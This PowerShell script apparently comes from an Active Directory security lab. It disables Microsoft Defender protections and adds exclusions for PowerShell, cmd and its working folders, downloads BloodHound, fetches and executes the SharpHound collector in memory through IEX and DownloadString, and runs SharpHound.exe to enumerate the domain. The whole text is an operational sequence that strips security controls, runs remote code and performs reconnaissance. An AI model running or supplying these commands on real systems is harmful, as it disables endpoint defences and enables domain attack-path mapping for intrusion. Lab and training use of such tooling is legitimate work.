Write-Output "[*] Defang EDR" 
New-Item -ItemType Directory -Path "C:\ADSH" -Force > $null
Set-MpPreference -ExclusionPath 'c:\users\Administrator'
Set-MpPreference -ExclusionPath 'c:\ADSH'
Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -EnableNetworkProtection AuditMode
Set-MpPreference -Force -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

Write-Output "[*] Get BloodHound" 
New-Item -ItemType Directory -Path "C:\ADSH\BloodHound\" -Force > $null
cd C:\ADSH\BloodHound\
$ProgressPreference = 'SilentlyContinue'
# We are using a static version of this BloodHound release.  The commented command below was the original.
# Invoke-WebRequest -URI "https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-win32-ia32.zip" -OutFile C:\ADSH\BloodHound\\BH-Rel32.zip
Invoke-WebRequest -URI "https://github.com/DefensiveOrigins/ADSH-Extras/raw/refs/heads/main/BH/BloodHound-win32-ia32.zip" -OutFile C:\ADSH\BloodHound\BH-Rel32.zip
$ProgressPreference = 'Continue'
#expand-archive .\BH-Rel32.zip
tar -xf .\BH-Rel32.zip
ls C:\ADSH\BloodHound\BloodHound-win32-ia32\ | Select-Object Name, Length

Write-Output "[*] Invoke Bloodhound Collector" 

cd C:\ADSH\BloodHound\
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/BloodHound/20ee4feb119a96cce3e5ebd5631f4ca64156694b/Collectors/SharpHound.ps1') 
Invoke-BloodHound 
ls | Select-Object Name, Length

Write-Output "[*] Get Sharphound" 

cd C:\ADSH\BloodHound\
$ProgressPreference = 'SilentlyContinue'
# We are using a static version of this BloodHound release.  The commented command below was the original.
# invoke-WebRequest -URI https://github.com/BloodHoundAD/BloodHound/archive/master.zip -OutFile "master.zip"
Invoke-WebRequest -URI https://github.com/DefensiveOrigins/ADSH-Extras/raw/refs/heads/main/BH/BloodHound-master.zip -OutFile "master.zip"
Write-Output "[!] Continue]" 
$ProgressPreference = 'Continue'
expand-Archive master.zip
cd .\master\BloodHound-master\Collectors\
ls | Select-Object Name, Length

Write-Output "[*] Invoke Sharphound" 
cd C:\ADSH\BloodHound\master\BloodHound-master\Collectors\
./SharpHound.exe
mv 202* C:\ADSH\BloodHound\
cd C:\ADSH\BloodHound\
ls | Select-Object Name, Length

Write-Output "[*] Invoke BloodhoundAD" 

cd C:\ADSH\BloodHound\
C:\ADSH\BloodHound\BloodHound-win32-ia32\BloodHound.exe

Write-Output "[!] Continue]" 